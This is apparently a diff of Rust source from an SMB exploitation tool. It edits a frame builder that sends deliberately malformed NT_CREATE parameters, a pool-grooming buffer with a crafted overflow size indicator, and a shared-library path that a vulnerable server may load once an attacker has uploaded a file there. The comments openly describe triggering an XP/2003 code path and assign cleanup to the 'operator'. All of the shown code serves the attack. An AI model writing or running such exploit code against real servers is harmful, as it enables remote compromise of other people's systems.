@@ -349,15 +349,16 @@ impl SmbFrameBuilder {
         // Byte count
         buf.put_u16_le(param_len as u16 + data_len as u16 + 1);
 
-        // NT_CREATE parameters (30 bytes)
-        buf.put_u32_le(0x00000000);      // Flags
-        buf.put_u32_le(0x00000000);      // Root directory FID
-        buf.put_u32_le(0x00100080);      // Desired access
-        buf.put_u64_le(0);               // Allocation size
-        buf.put_u32_le(0x00000020);      // File attributes (archive)
-        buf.put_u32_le(0x00000001);      // Share access (read)
-        buf.put_u32_le(0x00000001);      // Create disposition (open existing)
-        buf.put_u32_le(0);               // Create options - pad to 30 bytes total (2 bytes short — intentional malformation)
+        // NT_CREATE parameters (30 bytes total across 8 fields)
+        buf.put_u32_le(0x00000000);      // Flags (4)
+        buf.put_u32_le(0x00000000);      // Root directory FID (4)
+        buf.put_u32_le(0x00100080);      // Desired access (4)
+        buf.put_u64_le(0);               // Allocation size (8)
+        buf.put_u32_le(0x00000020);      // File attributes: archive (4)
+        buf.put_u16_le(0x0001);          // Share access: read (2)
+        buf.put_u32_le(0x00000001);      // Create disposition: open existing (4)
+        // Total so far: 4+4+4+8+4+2+4 = 30 bytes exactly.
+        // Create options omitted (intentional malformation that triggers the XP/2003 code path).
 
         // Data: pool-groom buffer with crafted size indicator
         buf.put_u32_le(data_len + 0x10000); // Overflow indicator embedded in data header
@@ -522,7 +523,11 @@ impl SmbFrameBuilder {
         buf.put_u32_le(0);               // Reserved x2
         buf.put_u32_le(0);
 
-        // File name: /tmp/smbx_probe.so (probes for .so execution path)
+        // File name: a uniquely named .so probe path to identify this tool's activity.
+        // NOTE: If the server is vulnerable and this path is opened, it may attempt to
+        // load it as a shared library. No actual file is written in this phase; the
+        // OPEN_ANDX will fail unless the attacker has previously uploaded to this path.
+        // Cleanup of any residual files is the operator's responsibility.
         let filename = b"/tmp/smbx_probe.so\x00";
         buf.put_u16_le(filename.len() as u16);
         buf.extend_from_slice(filename);
